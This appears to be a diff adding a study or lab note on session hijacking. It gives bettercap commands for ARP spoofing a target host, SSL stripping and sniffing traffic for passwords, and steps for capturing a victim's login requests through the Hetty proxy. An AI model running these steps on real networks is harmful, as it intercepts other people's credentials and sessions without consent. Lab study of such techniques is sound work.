@@ -1,0 +1,24 @@
+
+## Session Hijacking 11
+
+    # Hijack a session using OwaspZAP
+
+    # Intercept HTTP traffic using bettercap
+		bettercap -iface eth0
+			>> net.probe on
+			>> net.show
+			>> set http.proxy.sslstrip true
+			>> set arp.spoof.internal true 
+			>> set arp.spoof.targets 10.10.1.11 
+			>> http.proxy on
+			>> arp.spoof on
+			>> net.sniff on
+			>> set net.sniff.regexp ‘.*password=.+’ 
+
+    # Intercept HTTP traffic using Hetty
+		hetty.exe
+			go to http://localhost:8080 (to open hetty)
+			click manage project -> create new project -> click on proxy logs
+			in target machine set proxy with the ip address of my machine with port 8080 -> perform an action (login to a website)
+			then go to proxy logs and observe the captured requests
+
